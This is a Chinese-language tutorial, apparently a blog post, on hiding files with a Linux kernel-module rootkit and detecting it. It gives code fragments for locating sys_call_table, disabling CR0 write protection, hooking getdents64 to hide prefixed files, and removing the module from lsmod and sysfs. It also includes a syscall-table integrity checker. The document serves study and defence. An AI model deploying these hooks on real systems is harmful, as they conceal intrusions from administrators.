

## 攻击描述：

	攻击者在实现入侵之后很可能会将实现入侵相关的文件和目录隐藏起来，以逃避检测机制。

	大多数操作系统都有“隐藏”文件的概念，防止普通用户不小心修改到系统的特殊文件。并且自带简单的文件隐藏，比如`linux`前缀加`.`即在执行普通命令的时候隐藏这些文件。但`linux`环境下可以直接 `ls -a`来明确要求显示所以文件。为达到更好的隐藏效果，部分攻击者会通过更高明的方式来隐藏相关文件。例如hook系统调用表或者一些关键函数等。		本文主要讨论使用`hook`系统调用表实现隐藏特定前缀的文件，同时也提供对应的检测方法。

GitHub链接：[https://github.com/haozhuoD/hidefile_and_check](https://github.com/haozhuoD/hidefile_and_check)



## 攻击实例：

基于修改 sys_call_table 的系统调用挂钩：

### 具体实现步骤：

- 获取系统调用表地址

- 修改写保护位

- 分析`ls`并hook相关函数实现隐藏功能

- 实现自身隐藏

### 获取系统调用表地址

了解Linux内核的符号导出相关知识，详情见 *相关知识学习记录-Linux内核符号导出* 。

我们只需要了解`kallsyms_lookup_name`函数简单用法：

```text
kallsyms_lookup_name(“you want name”)  /*返回值为符号对应的地址 */
```

如果`kallsyms_lookup_name`函数被导出的话，我们可以很轻易地从`/proc/kallsyms`中读取我们想要的符号地址。下面我们通过`kprobe`进行内核函数探测 ，定位系统调用表符号。（`kprobe`最简单的一个应用）

```text
struct kprobe {
    struct hlist_node hlist;-----------------------------------------------被用于kprobe全局hash，索引值为被探测点的地址。
    /* location of the probe point */
    kprobe_opcode_t *addr;-------------------------------------------------被探测点的地址。      // 本次使用
    /* Allow user to indicate symbol name of the probe point */
    const char *symbol_name;-----------------------------------------------被探测函数的名称。    // 本次使用
  
  
    u32 flags;-------------------------------------------------------------状态标记。 
};
```

```text
int register_kprobe(struct kprobe *p);   --------------------------注册kprobe探测
void unregister_kprobe(struct kprobe *p);-----------------------卸载kprobe探测点
```

获取系统调用表实现关键代码：

```text
/*定义和kallsyms_lookup_name函数相同参数和返回值的函数，方便接受kprobe返回的函数地址*/
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;
  /*注册*/
  register_kprobe(&kp);
  /* assign kallsyms_lookup_name symbol to kp.addr */
  kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
  /*注销*/
  unregister_kprobe(&kp);
/*得到结果*/
  sys_call_table =  (unsigned long *) kallsyms_lookup_name("sys_call_table");
```

更详细的用法参考：[Linux kprobe调试技术使用 - ArnoldLu - 博客园 (cnblogs.com)](https://www.cnblogs.com/arnoldlu/p/9752061.html)  或 官方手册



### 修改写保护位

由于 `sys_call_table` 所在的内存是有写保护的， 所以我们需要先去掉写保护，再做修改,最后再恢复写保护。写保护指的是写入只读内存时出错。 这个特性可以通过 `CR0`寄存器控制(386、x64)：开启或者关闭， 只需要修改一个比特，也就是从 0 开始数的第 16 个比特。

内核版本更新到Linux5.3以后,发现对CR0的修改进行了保护，所以这里需要自定义write_cr0的实现。

可简单参考 https://blog.csdn.net/yt_42370304/article/details/84982864

关键代码实现：

```text
static  unsigned long __lkm_order;
​
static inline void mywrite_cr0(unsigned long value) {
​
 asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__lkm_order));
​
}
```



### 分析`ls`并hook相关函数实现隐藏功能

通过`strace ls`进行分析，发现在`getdents64`函数返回后得到我们`ls`的结果后调用`write()`输出到命令行  

![](https://tcs-devops.aliyuncs.com/storage/112b22d466a809702997b9b5759614276aba?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmIyMmQ0NjZhODA5NzAyOTk3YjliNTc1OTYxNDI3NmFiYSJ9.RCbkYZSpJCyNUOT23eosRBCgYyDjakwK6aGwS9TcPYg&download=image.png "")

进一步了解`getdents64()`，其获取目录文件中的目录项并返回函数声明一般在 `include/linux/syscalls.h` 中

![](https://tcs-devops.aliyuncs.com/storage/112ba99feb158556dcbc7be44c8762f2d5ca?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmJhOTlmZWIxNTg1NTZkY2JjN2JlNDRjODc2MmYyZDVjYSJ9.-uMP1_8gyuVg3PPvSUcPT4LS4omjBxVq4tdNRJY7xQc&download=image.png "")

![](https://tcs-devops.aliyuncs.com/storage/112b57ee994bb9fb0e7c17e84be8496a1ac8?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmI1N2VlOTk0YmI5ZmIwZTdjMTdlODRiZTg0OTZhMWFjOCJ9.MuNhZnFNOKBbn73T45kXNu9P4Hajq1Z-QRUOvqbiNbw&download=image.png "")

 `fgetpos()` 函数获取文件的初始位置

- `put_user` 修改第二个参数指向的数据结构`linux_dirent64` ,  成功后，将返回读取的字节数。在目录末尾，返回 0 。如果出错，则返回 -1，并正确设置`errno`。

- 看看 `linux_dirent64` ,先解决目录文件`（directory file）`的概念：这种文件包含了其他文件的名字以及指向与这些文件有关的信息的指针

![](https://tcs-devops.aliyuncs.com/storage/112b0447dd8988f019b1cf52bd1a8cfc6d7d?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmIwNDQ3ZGQ4OTg4ZjAxOWIxY2Y1MmJkMWE4Y2ZjNmQ3ZCJ9.aEb_Y95_tgQQhGSf5-OMZub04AJkl5V5uylGnFgd4VA&download=image.png "")

想要获取某目录下（比如a目下）b文件的详细信息，我们应该怎样做？

- 首先，我们使用`opendir`函数打开目录a，返回指向目录a的DIR结构体c。

- 接着，我们调用`readdir(c)`函数读取目录a下所有文件（包括目录），返回指向目录a下所有文件的`dirent`结构体`d`。`readdir` 经过各种各样的操作之后会通过 `filldir`把目录里的项目一个一个的填到 `getdents`返回的缓冲区里，缓冲区里是一个个的 `struct linux_dirent` 。

- 然后，我们遍历`d`，调用`stat（d->name,stat *e）`来获取每个文件的详细信息，存储在`stat`结构体`e`中。

所以我们要做的就是**加工**一下这一片**缓冲区**(第二个参数),最简单的想法当然是遍历，然后做相应修改啦.

![](https://tcs-devops.aliyuncs.com/storage/112bedfb2df7b2ca075bde80271275036b14?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmJlZGZiMmRmN2IyY2EwNzViZGU4MDI3MTI3NTAzNmIxNCJ9.60P7IfeUKX3C2OevjSCEuV3DHCKoqgnbRLsZetpEfw4&download=image.png "")

继续往下，它调用了`iterate_dir`

![](https://tcs-devops.aliyuncs.com/storage/112b65a172bd2647df9f0bb5566bfeceb2e8?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmI2NWExNzJiZDI2NDdkZjlmMGJiNTU2NmJmZWNlYjJlOCJ9.BCiptpXsIbqIP3PKEvAVJuM3CDiBiqfGYzmyzp0bleY&download=image.png "")

`iterate_dir`调用了`file->f_op->iterate_shared`或者 `file->f_op->iterate`

找到这个

![](https://tcs-devops.aliyuncs.com/storage/112b914506210f044ba08bb2ae1d6b17a35a?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmI5MTQ1MDYyMTBmMDQ0YmEwOGJiMmFlMWQ2YjE3YTM1YSJ9.igTCiBLBNLy8wjOcN0XnTyelRf7UBu_mgdwwp9NBZLY&download=image.png "")

继续往下发现 这个 `iterate` (作为成员指针) 有很多不同的实现方式

![](https://tcs-devops.aliyuncs.com/storage/112b7f3ff85494eb0ae5fd300a3ef078f9a2?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmI3ZjNmZjg1NDk0ZWIwYWU1ZmQzMDBhM2VmMDc4ZjlhMiJ9.gAXIyfH6LV7LOAL5ZDdGeytyZd_muPVnYuwttpUjfuw&download=image.png "")

这是因为VFS类似一个文件系统和内核的接口， 这个 `iterate` 在不同的文件系统有不同的实现，不方便一个个修改。`iterate_dir`是`vfs`的封装函数，该函数调用具体的文件系统的`iterate`函数填充目录。不同的文件系统的目录的`iterate`都不同，不过大体都是差不多的，都是读目录项，然后调用`dir_emit`函数填充至用户空间常用文件系统：机械硬盘和固态硬盘这类块设备常用的文件系统是`EXT4`和`btrfs`，闪存常用的文件系统时`JFFS2`和`UBIFS` 。综上考虑，实现策略时对`getdents64`函数返回的缓冲区进行一定的处理

关键代码实现：

```text
//我们处理的是用户态的linux_dirent64，所以需要先把它移到内核中拷贝到内核中便于我们遍历检查
err = copy_from_user((void *) kdirent, dirent, (unsigned long) ret);
while (i < ret) {
  dir = (void*) kdirent + i;
  //对返回区域逐一比对，注意按规则修改相应的d_reclen(文件名的长度)值
  if (memcmp(HIDE_ME, (char *)dir->d_name, strlen(HIDE_ME)) == 0) {
    printk(KERN_ALERT "mytest found the HIDE_ME file");
    if (dir == kdirent) {
    //如果是第一个目录，需要特殊处理
    //返回值ret需要减去当前目录名的大小
    ret -= dir->d_reclen;
    //整体前移
    memmove(dir, (void*)dir + dir->d_reclen, ret);
    continue;
   }
   //越过当前项
   prev->d_reclen += dir->d_reclen;
  }
  else {
   prev = dir;
  }
  i += dir->d_reclen;
 }
 //将检查过的缓冲区写回用户态
 err = copy_to_user(dirent, kdirent, (unsigned long) ret);
```



### 实现自身隐藏

粗暴地隐藏模块自身

在`lsmod`中隐藏

原理：

`lsmod`命令是通过`/proc/modules`来获取当前系统模块信息的。而`/proc/modules`中的当前系统模块信息是内核利用`struct modules`结构体的表头遍历内核模块链表、从所有模块的`struct module`结构体中获取模块的相关信息来得到的。结构体`struct module`在内核中代表一个内核模块。通过`insmod`(实际执行`init_module`系统调用)把自己编写的内核模块插入内核时，模块便与一个 `struct module`结构体相关联，并成为内核的一部分，所有的内核模块都被维护在一个全局链表中，链表头是一个全局变量`struct module *modules`。任何一个新创建的模块，都会被加入到这个链表的头部，通过`modules->next`即可引用到。为了让我们的模块在`lsmod`命令中的输出里消失掉，我们需要在这个链表内删除我们的模块：`list_del_init`函数定义于`include/linux/list.h`中

```text
list_del_init(&__this_module.list);
```

从`sysfs`中隐藏除了`lsmod`命令和相对应的查看`/proc/modules`以外，我们还可以在`sysfs`中，也就是通过查看`/sys/module/`目录来发现现有的模块。

```text
ls /sys/module/ | grep get
```

![](https://tcs-devops.aliyuncs.com/storage/112b23ef8bace731eabd64dd970c0491d429?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmIyM2VmOGJhY2U3MzFlYWJkNjRkZDk3MGMwNDkxZDQyOSJ9.qeF-Rtl0lk25lJxKiGs9au4Zt_JXm3WugOAupv5OoB4&download=image.png "")

在初始化函数中添加一行代码即可解决：

```text
kobject_del(&THIS_MODULE->mkobj.kobj);
```

原理：

`THIS_MODULE`在`include/linux/module.h`中的定义（即指向当前模块）`&THIS_MODULE->mkobj.kob`j则代表的是`struct module`结构体的成员`struct module_kobject`的一部分.`sysfs`是一种基于`ram`的文件系统，它提供了一种用于向用户空间展现内核空间里的对象、属性和链接的方法。`sysfs`与`kobject`层次紧密相连，它将`kobject`层次关系表现出来，使得用户空间可以看见这些层次关系。通常，`sysfs`是挂在在/sys目录下的，而`/sys/module`是一个`sysfs`的一个目录层次, 包含当前加载模块的信息. 我们通过`kobject_del()`函数删除我们当前模块的`kobject`就可以起到在`/sys/module`中隐藏`lkm`的作用。

关键代码实现：

```text
//在初始化函数的最后加入
list_del_init(&__this_module.list);     // lsmod
kobject_del(&THIS_MODULE->mkobj.kobj);	// /sys/module/
```



## 攻击展示：	

![](https://tcs-devops.aliyuncs.com/storage/112b5512e590edd2bc7a28c4a972bb0bd41d?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmI1NTEyZTU5MGVkZDJiYzdhMjhjNGE5NzJiYjBiZDQxZCJ9.hJ3lDI8B_XPbg1FudqrO9fFdzX9JPcROp3z-myc1dV8&download=image.png "")

## 检测方法：

以上做法说白了**就是修改系统调用表，我们只要监控好原始正确的系统调用表，在想要检测的时候将当前的系统调用表和之前存储好的表的内容进行一一比较即可。	**

**	监控系统调用表。在刚开机时先进行一次**备份，之后可随时进行检查。（且可实现自我纠正）

实现方法：

	主要有为两个动态加载模块。一个模块对当前系统调用表进行存储，并将想要的符号导出(全局定义且非static)。另一个模块将之前存储好的系统调用表与当前内核中的系统调用表进行对比。

第一个模块：`checker.c` 遍历当前系统调用表并进行存储，同时将相应的符号导出。		       第二个模块：`docheck.c`查找第一个模块存储的系统调用表，将其与当前的系统调用表进行比较。

关键代码实现：

	第一个模块:

```text
for(i=0;i<NR_syscalls;i++) {
  	myorg_syscall_table[i]=syscall_table[i];  
}
```

	第二个模块:

```text
for(i=0;i<NR_syscalls;i++) {
    if(org_syscall_table[i]!=syscall_table[i]){
        printk(KERN_ALERT "mytest docheck: find someone want to change syscall_table !!! +++++++++++");
        orig_cr0 = read_cr0();
        mywrite_cr0(orig_cr0 & (~0x10000));
        syscall_table[i]=org_syscall_table[i];           //保护还原
        mywrite_cr0(orig_cr0);
    }  
}
```



检测展示：

检测提示信息：

![](https://tcs-devops.aliyuncs.com/storage/112bdf549744e2c5361ffa46f9205eb57051?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmJkZjU0OTc0NGUyYzUzNjFmZmE0NmY5MjA1ZWI1NzA1MSJ9.qetyHx56a9h-W9kmcoh9r07c1L9NnbzeSiNgOY14U8Q&download=image.png "")

自纠正展示：

![](https://tcs-devops.aliyuncs.com/storage/112b817b2b9393cfc54a7da4fcaf7d24a523?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmI4MTdiMmI5MzkzY2ZjNTRhN2RhNGZjYWY3ZDI0YTUyMyJ9.EWtLfv2vQkMvXMwMC5OUfMEd3dKcFZFT9TNnpXFJ4No&download=image.png "")



## 相关知识学习内容记录：

### 一些已有rootkit与检测rootkit工具的体验

可先在`github`下载 `Rootkit攻击脚本` 和 `rootkit检测工具`先简单体验一遍攻击和检测的流程。

体验流程参考开源项目：

`rootkit`:`Reptile` [f0rb1dd3n/Reptile: LKM Linux rootkit (github.com)](https://github.com/f0rb1dd3n/Reptile)参考Repfile的wiki手册

Reptile实现的大致逻辑参考[LKM rootkit：[LKM rootkit：Reptile学习 - 番茄汁汁 - 博客园 (cnblogs.com)](https://www.cnblogs.com/likaiming/p/10987804.html)

`rootkit检测工具`：*rkhunter* 、*chkrootkit* 



### Linux内核符号导出

符号导出主要是指全局变量和函数

模块编译时查找符号：

- 在本模块内的符号表中找（也就是自实现模块源码的变量和函数实现）

- 在其他模块中查找他们的EXPORT_SYMBOL导出的符号

- 在模块目录下的Module.symvers文件中找 （如果你没有自己实现或者导入这个文件，那么编译模块的过程中会自动帮你建立一个空白的Module.symvers文件）

```text
EXPORT_SYSBOL(name)   //导出符号
EXPORT_SYSBOL_GPL(name)
```

模块导出后的函数位于/proc/kallsyms文件(Linux内核符号表)中  



/proc/kallsyms  与  /boot/System.map-<kernel-version>

/proc/kallsyms是一个特殊的文件，它并不是存储在磁盘上的文件。这个文件只有被读取的时候，才会由内核产生内容。因为这些内容是内核动态生成的，所以可以保证其中读到的地址是正确的。（内核 编译时需开启CONFIG_KALLSYMS_ALL编译选项）

System.map-<kernel-version>是编译内核时产生的，它里面记录了**编译时**内核符号的地址。如果能够保证当前使用的内核与<kernel-version>是一一对应的，那么从System.map-<kernel-version>中读出的符号地址就是正确的。**注意！** 但是如果模块是动态运行的，对应符号地址则不一定正确。

```text
cat /proc/kallsyms | grep 'sys_close' #查看
```

查看如下图，系统调用sys_close 在20.04中不是导出函数，所以无法识别

![](https://tcs-devops.aliyuncs.com/storage/112bab922f7f9841bc4ac652d3bcdee5b92a?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmJhYjkyMmY3Zjk4NDFiYzRhYzY1MmQzYmNkZWU1YjkyYSJ9.awwlLKlQ5NBt-I_N2tthFJIo3B-wRa_EYjZ9nAXUUDU&download=image.png "")

（据说之前旧版的Linux甚至syscall_table都对模块可见，可以直接读取地址。2.6之后加入内核符号导出机制，减少了命名空间的污染并且可以进行适当的信息隐蔽）



### 系统调用参数传递（hook系统调用模块insmod之后killed大多因为参数传递问题）

查资料：        

		在系统调用中，寄存器从用户空间传过来后SAVE_ALL压入堆栈，接着调用相应的系统调用函数，这样系统调用函数一定要保证是通过堆栈传递参数.

通过中断的方式进行系统调用需要了解一下系统调用输入参数的传递方式

系统调用服务例程是C函数，它和普通的C函数一样希望从栈里面读取到它想要的参数。但是我们在用户态陷入内核态后，如何将用户栈的参数如何移到内核栈呢？

- 当输入的参数小于等于5个时，*linux*直接使用CPU中的寄存器暂存参数。 

- 当输入的参数大于5个时，把参数按照顺序放入连续的内存中，并把这块内存的首地址放入*ebx*中

通过寄存器传递参数时

`eax`存放子功能号`ebx`存放第一个参数

`ecx存放第二个参数

`edx`存放第三个参数`esi`存放第四个参数`edi`存放地五个参数

在转到内核态后  SAVE_ALL  将存在CPU中的参数压入内核栈

服务例程的返回值记录在`eax`中

源码分析：

*linux-5.11/arch/x86/entry/entry_64.S*  中对用户态系统调用传参进行了说明。简单来说就是参数不进用户栈，直接储到CPU里特定的几个寄存器里，然后在内核态在通过push将CPU寄存器的值压入内核栈。

同时你会发现他这个真实的顺序和上一部分说的并不一样

![](https://tcs-devops.aliyuncs.com/storage/112ba9d2ec6acfa7496eea200025f08335b9?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmJhOWQyZWM2YWNmYTc0OTZlZWEyMDAwMjVmMDgzMzViOSJ9.W45q4xNI-ScYqctY6Li2zC9Al6IOBnxhi4G0izeY-NM&download=image.png "")

查看源码：这个文件就是定义了 *entry_SYSCALL_64* 这个符号展开

![](https://tcs-devops.aliyuncs.com/storage/112bfdf92bb7566b1f276172d2b32c06321f?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmJmZGY5MmJiNzU2NmIxZjI3NjE3MmQyYjMyYzA2MzIxZiJ9.tRxNrFQrBqOnNtUzp76kl8dx022L5Os2t60ispKPOko&download=image.png "")

有个  PUSH_AND_CLEAR_REGS  的宏，查看宏定义。发现确实是按开头注释所说的顺序读取参数，将这部分寄存器寄存器按一定次序压入内核栈（或者说是在栈里面形成了`pt_regs`这个结构体）。同时还给出了`pt_regs->xx` 这样在内核态访问各个参数的提示。然后 就调用 `do_syscall_64`, 在`do_syscall_64`里面，从`rax` 里面拿出系统调用号，然后根据系统调用号，在系统调用表 `sys_call_table`中找到相应的函数进行调用，并将寄存器中保存的参数取出来，作为函数参数。

![](https://tcs-devops.aliyuncs.com/storage/112b64f2f0ce7f49e16271ac44aeff497f3d?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmI2NGYyZjBjZTdmNDllMTYyNzFhYzQ0YWVmZjQ5N2YzZCJ9.HVnurDZN6fxtyfiZ0HOZFEiwIeHgrpBz_vhzSGSYGoI&download=image.png "")

在看看 pt_regs 这个结构体的定义 （截取了部分），分为两部分。一部分就是我们上面保存的，总是在进入内核的时候保存。另一部分只在系统调用需要用到完整 pt_regs 的时候才保存 。

![](https://tcs-devops.aliyuncs.com/storage/112b5e062eff65e048215b192c6530144c15?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmI1ZTA2MmVmZjY1ZTA0ODIxNWIxOTJjNjUzMDE0NGMxNSJ9.KhRwF34xZjDvs7xuwUKXk9ySgzW_sRs3fc8Qi4nAi4E&download=image.png "")

大致的结构如下：

![](https://tcs-devops.aliyuncs.com/storage/112b66041b6ef8b5d9b0ec7de35d2548192b?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9hcHBJZCI6IjVlNzQ4MmQ2MjE1MjJiZDVjN2Y5YjMzNSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY1MDAzMjU3MSwiaWF0IjoxNjQ5NDI3NzcxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzExMmI2NjA0MWI2ZWY4YjVkOWIwZWM3ZGUzNWQyNTQ4MTkyYiJ9.6g7ihkbthamCpxw78eNO8MyHIFTsQTJVXLMSvf3kPF8&download=image.png "")

图源 [https://www.codenong.com/cs106088896/](https://www.codenong.com/cs106088896/)

